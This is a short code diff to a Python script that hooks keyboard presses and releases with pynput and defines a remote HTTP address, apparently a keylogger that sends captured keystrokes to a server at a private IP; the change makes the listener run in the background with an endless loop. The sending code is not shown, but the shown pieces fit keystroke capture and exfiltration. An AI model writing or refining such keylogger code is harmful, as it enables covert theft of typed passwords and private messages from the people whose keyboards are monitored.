@@ -1,6 +1,7 @@
 from pynput import keyboard
 import requests
 from lib import key_to_special
+from time import sleep
 
 ADDRESS = "http://10.42.0.92:5000/"
 
@@ -28,7 +29,10 @@ def on_release(key):
         return False
 
 # Collect events until released
-with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
-    listener.join()
+listener = keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release)
+listener.start()
+
+while True:
+    sleep(0.1)
